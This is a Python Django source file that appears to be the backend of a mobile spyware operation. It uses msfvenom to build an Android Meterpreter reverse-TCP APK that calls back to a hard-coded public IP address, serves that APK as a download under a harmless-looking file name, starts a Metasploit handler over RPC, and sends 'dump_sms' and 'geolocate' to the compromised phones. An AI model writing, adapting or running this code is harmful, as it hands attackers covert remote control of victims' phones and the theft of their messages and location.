from django.http import HttpResponse, HttpResponseRedirect
from django.template import loader
from django.urls import reverse
from django.views.decorators.csrf import csrf_protect, csrf_exempt
from django.http import HttpResponse
from django.template import RequestContext
import threading
import os
import requests
import json
import subprocess
from subprocess import Popen, PIPE


def ssh_and_apk(HOST="45.56.113.154", PORT=101, apk_name="payload"):
    os.system(
        f"/opt/metasploit-framework/bin/msfvenom -p android/meterpreter_reverse_tcp LHOST={HOST} LPORT={PORT} AndroidWakelock=true AutoUnhookProcess=true SessionCommunicationTimeout=99999 > {apk_name}.apk"
    )
    print("done ")


def get_apk_file(request, apk_name):
    apk_file = open(f"{apk_name}.apk", "rb")
    response = HttpResponse(apk_file, content_type="application/vnd.android.package-archive")
    response["Content-Disposition"] = 'attachment; filename="android5.apk"'
    return response


def connect_msfRcp():
    client = MsfRpcClient("securepassword", ssl=True)
    exploit = client.modules.use("exploit", "multi/handler")
    payload = client.modules.use("payload", "android/meterpreter/reverse_tcp")
    payload.runoptions["LHOST"] = "127.0.0.1"
    payload.runoptions["LPORT"] = 101
    payload.runoptions["AndroidWakelock"] = True
    payload.runoptions["AutoUnhookProcess"] = True
    payload.runoptions["SessionCommunicationTimeout"] = 99999
    exploit.execute(payload=payload)


def get_current_sessions():
    client = MsfRpcClient("securepassword", ssl=True)
    for i in client.sessions.list().keys():
        shell = client.sessions.session(i)
        shell.write("dump_sms")
        print(shell.read())


"""from pymetasploit3.msfrpc import MsfRpcClient


client = MsfRpcClient("securepassword", ssl=True)

exploit = client.modules.use("exploit", "multi/handler")
payload = client.modules.use("payload", "android/meterpreter/reverse_tcp")
payload.runoptions["LHOST"] = "45.56.113.154"
payload.runoptions["LPORT"] = 101
payload.runoptions["AndroidWakelock"] = True
payload.runoptions["AutoUnhookProcess"] = True
payload.runoptions["SessionCommunicationTimeout"] = 99999


exploit.execute(payload=payload)

client.sessions.list

shell = client.sessions.session("1")
shell.write("geolocate")
print(shell.read())
"""
